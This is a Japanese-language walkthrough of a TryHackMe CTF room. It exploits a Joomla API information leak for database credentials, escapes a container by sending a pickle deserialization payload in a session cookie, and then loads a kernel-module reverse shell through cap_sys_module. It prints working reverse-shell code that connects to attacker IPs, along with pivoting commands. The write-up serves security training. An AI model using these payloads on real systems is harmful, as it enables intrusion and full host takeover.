# Voyage CTF

https://tryhackme.com/room/voyage

## Enumeration

```shell
TARGET=10.48.141.100
sudo bash -c "echo $TARGET   voyage >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack ttl 64
80/tcp   open  http         syn-ack ttl 64
2222/tcp open  EtherNetIP-1 syn-ack ttl 63
```

```sh
sudo nmap -sV -p22,80,2222 $TARGET

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
```

バージョン違いのSSHが2つと、HTTP

```sh
root@ip-10-48-120-146:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.48.141.100
+ Target Hostname:    voyage
+ Target Port:        80
+ Start Time:         2025-12-04 01:15:34 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.58 (Ubuntu)
+ Cookie 310c29008fc04f792e0bccb4682e5b78 created without the httponly flag
+ Uncommon header 'referrer-policy' found, with contents: strict-origin-when-cross-origin
+ Uncommon header 'x-frame-options' found, with contents: SAMEORIGIN
+ Uncommon header 'cross-origin-opener-policy' found, with contents: same-origin
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x2fc 0x5f38101bc4640 
+ Cookie 03245e095856e4447d1dfb528d67c5d3 created without the httponly flag
+ File/dir '/administrator/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Retrieved x-powered-by header: JoomlaAPI/1.0
+ File/dir '/cache/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/cli/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/components/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/includes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/language/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/layouts/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/modules/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/plugins/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 15 entries which should be manually viewed.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-877: HTTP TRACK method is active, suggesting the host is vulnerable to XST
+ OSVDB-3092: /administrator/: This might be interesting...
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3092: /tmp/: This might be interesting...
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+ /administrator/index.php: Admin login page/section found.
+ 1707 items checked: 0 error(s) and 25 item(s) reported on remote host
+ End Time:           2025-12-04 01:15:37 (GMT0) (3 seconds)
---------------------------------------------------------------------------
```

/administrator にアクセスしたら、Joomlaのログイン画面だった。バージョンは不明。

## CVE-2023-23752 (Joomify)

http://voyage/api/index.php/v1/config/application?public=true

MySQL の rootユーザーのパスワードが出ていた。

```json
{"links":{"self":"http:\/\/voyage\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/voyage\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/voyage\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Tourism","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes":{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"root","id":224}},{"type":"application","id":"224","attributes":{"password":"[REDACTED]","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla_db","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"ecsjh_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}
```

http://voyage/api/index.php/v1/users?public=true

```json
{"links":{"self":"http:\/\/voyage\/api\/index.php\/v1\/users?public=true"},"data":[{"type":"users","id":"377","attributes":{"id":377,"name":"root","username":"root","email":"mail@tourism.thm","block":0,"sendEmail":1,"registerDate":"2025-06-21 13:38:44","lastvisitDate":null,"lastResetTime":null,"resetCount":0,"group_count":1,"group_names":"Super Users"}}],"meta":{"total-pages":1}}
```

## SSH 2222 エスケープ１

入手したパスワードを使って、2222ポートのSSHにログインできた。

rootユーザーだがゲストOS。

```sh
root@f5eb774507f2:~# ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.1  12196  7040 ?        Ss   01:04   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root          13  0.0  0.2  13912  8832 ?        Rs   01:48   0:00 sshd: root@pts/0
root          24  0.0  0.0   6000  3584 pts/0    Ss   01:48   0:00 -bash
root          31  0.0  0.0   7652  3072 pts/0    R+   01:50   0:00 ps aux
```

特権コンテナではない。

```sh
root@f5eb774507f2:~# capsh --print
WARNING: libcap needs an update (cap=40 should have a name).
Current: = cap_chown,cap_dac_override,cap_fowner,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write
Ambient set =
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root) euid=0(root)
gid=0(root)
groups=0(root)
Guessed mode: UNCERTAIN (0)
```

ゲストOSのネットワーク

```sh
root@f5eb774507f2:~# ip addr show
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
8: eth0@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:a8:64:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.168.100.10/24 brd 192.168.100.255 scope global eth0
       valid_lft forever preferred_lft forever
```

nping をコピーしてホストを探す。
192.168.100.1、192.168.100.12 が応答を返している。

```sh
root@f5eb774507f2:~# nping 192.168.100.10/24 | grep RCVD
RCVD (1.0142s) ICMP [192.168.100.1 > 192.168.100.10 Echo reply (type=0/code=0) id=57561 seq=1] IP [ttl=64 id=53433 iplen=28 ]
RCVD (12.0278s) ICMP [192.168.100.12 > 192.168.100.10 Echo reply (type=0/code=0) id=34003 seq=1] IP [ttl=64 id=58688 iplen=28 ]
```

192.168.100.1 はHTTPサーバーで、前に見たのと同じJoomlaのログイン画面を返していた。

ligolo-ng で 192.168.100.0/24 ネットワークをトンネリング。

```sh
./agent -ignore-cert -connect 192.168.138.236:11601 &
```

```sh
sudo ./proxy -selfcert

ifcreate --name ligolo
tunnel_start
session
add_route --name ligolo --route 192.168.100.0/24
```

192.168.100.12 で5000ポートが開いていることを発見した。

```sh
$ nmap -v -p- -Pn --min-rate 10000 192.168.100.12

...
PORT     STATE SERVICE
5000/tcp open  upnp
```

### 192.168.100.12:5000

ブラウザで表示すると、`Tourism Secret Finance Panel` のログインページ。  
HTTPヘッダーから、`Server: Werkzeug/3.1.3 Python/3.10.12`

admin / password でログインできた。`Welcome admin` と表示されている。  
ユーザー名とパスワードは何でもログインでき、`{{7*'7'}}` というユーザー名にしたがそのまま表示された。  

adminというユーザー名のとき、セッションIDは下記になる。パスワードだけ変えても変わらない。

```
80049526000000000000007d94288c0475736572948c0561646d696e948c07726576656e7565948c05383530303094752e
```

これを CyberChef の`From Hex`でファイル保存し、https://mark0.net/onlinetrid.py#google_vignette で調べたところ、`Python Pickle serialized data (v4)`との判定。

セッションIDペイロードのシリアライズ。

```python
import pickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.138.236\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'",))
print(pickle.dumps(P()).hex())
```

セッションIDをセットして、リバースシェル取得成功！（下記はゲストOSでリッスンしているが、普通にkaliからリッスンしても取れた）

```sh
root@f5eb774507f2:~# ./ncat -nlvp 8888
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 192.168.100.12.
Ncat: Connection from 192.168.100.12:49008.
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

ユーザーフラグを発見。

```sh
# ls -al /root
ls -al /root
total 140
drwx------ 1 root root  4096 Jun 25 14:53 .
drwxr-xr-x 1 root root  4096 Jun 26 18:36 ..
-rw-r--r-- 1 root root   137 Jun 25 14:48 .Module.symvers.cmd
-rw------- 1 root root   446 Jun 26 18:37 .bash_history
-rw-r--r-- 1 root root  3106 Oct 15  2021 .bashrc
drwxr-xr-x 3 root root  4096 Jun 24 12:21 .local
-rw-r--r-- 1 root root    86 Jun 25 14:48 .modules.order.cmd
-rw-r--r-- 1 root root   161 Jul  9  2019 .profile
-rw-r--r-- 1 root root   163 Jun 25 14:48 .revshell.ko.cmd
-rw-r--r-- 1 root root   120 Jun 25 14:48 .revshell.mod.cmd
-rw-r--r-- 1 root root 45792 Jun 25 14:48 .revshell.mod.o.cmd
-rw-r--r-- 1 root root 44610 Jun 25 14:48 .revshell.o.cmd
-rw-r--r-- 1 root root    38 Jun 24 15:17 user.txt
```

まだゲストOSの中。

```sh
root@d221f7bc7bf8:/finance-app# ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.7  36032 29116 ?        Ss   06:05   0:00 python3 app.py
root           7  0.1  0.7 332000 31096 ?        Sl   06:05   0:02 /usr/bin/python3 app.py
root         173  0.0  0.0   2892  1664 ?        S    06:45   0:00 sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.138.236",8888));os.dup2(s.fileno(),0); os.dup2(s.fil
root         174  0.0  0.2  14912  9856 ?        S    06:45   0:00 python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.138.236",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1
root         175  0.0  0.0   2892  1536 pts/0    Ss   06:45   0:00 sh
root         177  0.0  0.2  13604  8064 pts/0    R+   06:45   0:00 python3 -c import pty; pty.spawn("/bin/bash")
root         178  0.0  0.0   5004  3840 pts/1    Ss   06:45   0:00 /bin/bash
root         186  0.0  0.0   7440  3072 pts/1    R+   06:46   0:00 ps aux
```

## エスケープ２

bashヒストリを見ると、カーネルモジュールをインサートした形跡がヒントになっている。

```sh
root@d221f7bc7bf8:~# cat .bash_history
exit
ls
exit
ls
curl 10.10.9.89:9000/hello.c > hello.c
ls
curl 10.10.9.89:9000/Makefile > Makefile
make
ls
mv hello.c revshell.c
ls
make
insmod revshell.ko
exit
ls
cd ~
;s
ls
rm Makefile 
rm Module.symvers 
rm modules.order 
rm revshell.
rm revshell.c 
rm revshell.ko 
rm revshell.mod
rm revshell.mod.c 
rm revshell.mod.o 
rm revshell.o 
clear
ls
cd /home/
ls
cd /root/
ls
exit
ls
cd templates/
ls
cat index.html 
nano index.html 
exit
exit
exit
export TERM=xterm
which docker
exit
```

cap_sys_module が付いている。

```sh
root@d221f7bc7bf8:/finance-app# capsh --print
Current: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Ambient set =
Current IAB: !cap_dac_read_search,!cap_linux_immutable,!cap_net_broadcast,!cap_net_admin,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_rawio,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_lease,!cap_audit_control,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read,!cap_perfmon,!cap_bpf,!cap_checkpoint_restore
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root) euid=0(root)
gid=0(root)
groups=0(root)
Guessed mode: UNCERTAIN (0)
```

cap_sys_module + Docker エスケープの記事

https://medium.com/@ibm_ptc_security/escaping-the-container-weaponizing-kernel-module-loading-via-cap-sys-module-538008b3d8d8

前提条件の確認

```sh
root@d221f7bc7bf8:~# cat /proc/sys/kernel/modules_disabled
0
```

コードは、https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html#cap_sys_module から拝借

hello.c

```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/192.168.131.69/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```
obj-m +=hello.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

手順通りに実行すると、対応するバージョンのヘッダーがないというエラーになった。

```sh
root@d221f7bc7bf8:~# make
make -C /lib/modules/6.8.0-1031-aws/build M=/root modules
make[1]: *** /lib/modules/6.8.0-1031-aws/build: No such file or directory.  Stop.
make: *** [Makefile:4: all] Error 2

root@d221f7bc7bf8:~# ls /lib/modules
6.8.0-1029-aws  6.8.0-1030-aws
```

6.8.0-1030-aws でmakeしてみる。

```
obj-m += hello.o

all:
	make -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) modules

clean:
    make -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) clean
```

ko ファイルが出力された。

```sh
root@d221f7bc7bf8:~# make
make -C /lib/modules/6.8.0-1030-aws/build M=/root modules
make[1]: Entering directory '/usr/src/linux-headers-6.8.0-1030-aws'
warning: the compiler differs from the one used to build the kernel
  The kernel was built by: x86_64-linux-gnu-gcc-12 (Ubuntu 12.3.0-1ubuntu1~22.04) 12.3.0
  You are using:           gcc-12 (Ubuntu 12.3.0-1ubuntu1~22.04) 12.3.0
  CC [M]  /root/hello.o
  MODPOST /root/Module.symvers
  CC [M]  /root/hello.mod.o
  LD [M]  /root/hello.ko
  BTF [M] /root/hello.ko
Skipping BTF generation for /root/hello.ko due to unavailability of vmlinux
make[1]: Leaving directory '/usr/src/linux-headers-6.8.0-1030-aws'
```

```sh
root@d221f7bc7bf8:~# ls -al
total 580
drwx------ 1 root root   4096 Dec  5 00:55 .
drwxr-xr-x 1 root root   4096 Jun 26 18:36 ..
-rw-r--r-- 1 root root    137 Dec  5 00:55 .Module.symvers.cmd
-rw------- 1 root root    446 Jun 26 18:37 .bash_history
-rw-r--r-- 1 root root   3106 Oct 15  2021 .bashrc
-rw-r--r-- 1 root root    151 Dec  5 00:55 .hello.ko.cmd
-rw-r--r-- 1 root root    111 Dec  5 00:55 .hello.mod.cmd
-rw-r--r-- 1 root root  45753 Dec  5 00:55 .hello.mod.o.cmd
-rw-r--r-- 1 root root  44565 Dec  5 00:55 .hello.o.cmd
drwxr-xr-x 3 root root   4096 Jun 24 12:21 .local
-rw-r--r-- 1 root root     83 Dec  5 00:55 .modules.order.cmd
-rw-r--r-- 1 root root    161 Jul  9  2019 .profile
-rw-r--r-- 1 root root    163 Jun 25 14:48 .revshell.ko.cmd
-rw-r--r-- 1 root root    120 Jun 25 14:48 .revshell.mod.cmd
-rw-r--r-- 1 root root  45792 Jun 25 14:48 .revshell.mod.o.cmd
-rw-r--r-- 1 root root  44610 Jun 25 14:48 .revshell.o.cmd
-rw-r--r-- 1 root root    150 Dec  5 00:55 Makefile
-rw-r--r-- 1 root root      0 Dec  5 00:55 Module.symvers
-rw-r--r-- 1 root root    720 Dec  5 00:55 hello.c
-rw-r--r-- 1 root root 159784 Dec  5 00:55 hello.ko
-rw-r--r-- 1 root root     14 Dec  5 00:55 hello.mod
-rw-r--r-- 1 root root   1135 Dec  5 00:55 hello.mod.c
-rw-r--r-- 1 root root 145256 Dec  5 00:55 hello.mod.o
-rw-r--r-- 1 root root  15864 Dec  5 00:55 hello.o
-rw-r--r-- 1 root root     14 Dec  5 00:55 modules.order
-rw-r--r-- 1 root root     38 Jun 24 15:17 user.txt
```

リーバスシェルモジュールのインサート

```sh
insmod hello.ko
```

取得成功！

```sh
$ nc -lnvp 4444         
listening on [any] 4444 ...
connect to [192.168.131.69] from (UNKNOWN) [10.64.138.78] 37924
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@tryhackme-2404:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

```sh
root@tryhackme-2404:/# ls -al /root
ls -al /root
total 44
drwx------  5 root root 4096 Jun 24 15:24 .
drwxr-xr-x 22 root root 4096 Dec  5 00:42 ..
-rw-------  1 root root    0 Oct 22  2024 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
-rw-------  1 root root   20 Jun 21 13:17 .lesshst
drwxr-xr-x  3 root root 4096 Oct 22  2024 .local
-rw-------  1 root root   72 Jun 21 13:37 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Oct 22  2024 .ssh
-rw-r--r--  1 root root  175 Jun 21 13:20 .wget-hsts
-rw-r--r--  1 root root   38 Jun 24 15:24 root.txt
drwxr-xr-x  4 root root 4096 Oct 22  2024 snap
```

## 振り返り

- これまでに学んできた様々なテクニックを、これでもかと駆使できたBOXだった。
- 今回の場合はバージョン違いのカーネルで make できたが、できなかった場合にどうすれば良いのか分からないのが課題。（自分のマシンでmakeするしかないのだろうが、自信がない）

## Tags

#tags:docker #tags:デシリアライズ #tags:pickle #tags:joomla #tags:ligolo-ng #tags:insmod
